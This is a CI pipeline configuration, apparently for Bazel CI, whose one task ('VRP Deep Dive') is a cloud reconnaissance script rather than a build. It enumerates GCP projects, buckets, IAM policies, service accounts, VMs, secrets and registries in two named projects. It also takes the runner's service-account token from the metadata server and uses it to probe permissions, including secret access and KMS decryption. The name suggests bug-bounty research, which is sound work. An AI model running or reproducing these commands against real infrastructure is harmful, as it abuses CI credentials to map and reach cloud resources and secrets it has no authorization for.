---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === VRP Deep Dive: GCP SA access enumeration ==="
      - "echo"
      - "echo === 1. All accessible GCP projects ==="
      - "gcloud projects list --format='table(projectId,name,projectNumber)' 2>&1 || true"
      - "echo"
      - "echo === 2. blaze-perf project details ==="
      - "gcloud projects describe blaze-perf --format=json 2>&1 || true"
      - "echo"
      - "echo === 3. GCS buckets in bazel-untrusted ==="
      - "gsutil ls -p bazel-untrusted 2>&1 || true"
      - "echo"
      - "echo === 4. GCS buckets in blaze-perf ==="
      - "gsutil ls -p blaze-perf 2>&1 || true"
      - "echo"
      - "echo === 5. bazel-untrusted IAM policy ==="
      - "gcloud projects get-iam-policy bazel-untrusted --format='table(bindings.role,bindings.members)' 2>&1 | head -60 || true"
      - "echo"
      - "echo === 6. blaze-perf IAM policy ==="
      - "gcloud projects get-iam-policy blaze-perf --format='table(bindings.role,bindings.members)' 2>&1 | head -60 || true"
      - "echo"
      - "echo === 7. Service accounts in bazel-untrusted ==="
      - "gcloud iam service-accounts list --project bazel-untrusted --format='table(email,displayName)' 2>&1 || true"
      - "echo"
      - "echo === 8. Service accounts in blaze-perf ==="
      - "gcloud iam service-accounts list --project blaze-perf --format='table(email,displayName)' 2>&1 || true"
      - "echo"
      - "echo === 9. Compute instances in bazel-untrusted ==="
      - "gcloud compute instances list --project bazel-untrusted --format='table(name,zone,status,machineType)' 2>&1 | head -30 || true"
      - "echo"
      - "echo === 10. Compute instances in blaze-perf ==="
      - "gcloud compute instances list --project blaze-perf --format='table(name,zone,status,machineType)' 2>&1 | head -30 || true"
      - "echo"
      - "echo === 11. Secret Manager secrets in bazel-untrusted ==="
      - "gcloud secrets list --project bazel-untrusted --format='table(name)' 2>&1 || true"
      - "echo"
      - "echo === 12. Secret Manager secrets in blaze-perf ==="
      - "gcloud secrets list --project blaze-perf --format='table(name)' 2>&1 || true"
      - "echo"
      - "echo === 13. Cloud Functions in bazel-untrusted ==="
      - "gcloud functions list --project bazel-untrusted --format='table(name,status,runtime)' 2>&1 || true"
      - "echo"
      - "echo === 14. Artifact Registry repos in bazel-untrusted ==="
      - "gcloud artifacts repositories list --project bazel-untrusted --format='table(name,format)' 2>&1 || true"
      - "echo"
      - "echo === 15. Artifact Registry repos in blaze-perf ==="
      - "gcloud artifacts repositories list --project blaze-perf --format='table(name,format)' 2>&1 || true"
      - "echo"
      - "echo === 16. testIamPermissions on bazel-untrusted ==="
      - "curl -s -X POST -H \"Authorization: Bearer $(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"storage.buckets.list\",\"storage.objects.list\",\"storage.objects.get\",\"storage.objects.create\",\"compute.instances.list\",\"iam.serviceAccounts.list\",\"secretmanager.secrets.list\",\"secretmanager.versions.access\",\"cloudfunctions.functions.list\",\"cloudkms.cryptoKeys.list\",\"cloudkms.cryptoKeyVersions.useToDecrypt\",\"resourcemanager.projects.get\",\"logging.logEntries.list\",\"container.clusters.list\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/bazel-untrusted:testIamPermissions' 2>&1 | python3 -c 'import json,sys;d=json.load(sys.stdin);print(json.dumps(d,indent=2))' || true"
      - "echo"
      - "echo === 17. testIamPermissions on blaze-perf ==="
      - "curl -s -X POST -H \"Authorization: Bearer $(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"storage.buckets.list\",\"storage.objects.list\",\"storage.objects.get\",\"storage.objects.create\",\"compute.instances.list\",\"iam.serviceAccounts.list\",\"secretmanager.secrets.list\",\"secretmanager.versions.access\",\"cloudfunctions.functions.list\",\"cloudkms.cryptoKeys.list\",\"cloudkms.cryptoKeyVersions.useToDecrypt\",\"resourcemanager.projects.get\",\"logging.logEntries.list\",\"container.clusters.list\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/blaze-perf:testIamPermissions' 2>&1 | python3 -c 'import json,sys;d=json.load(sys.stdin);print(json.dumps(d,indent=2))' || true"
      - "echo"
      - "echo === DONE ==="
    build_targets:
      - "//..."
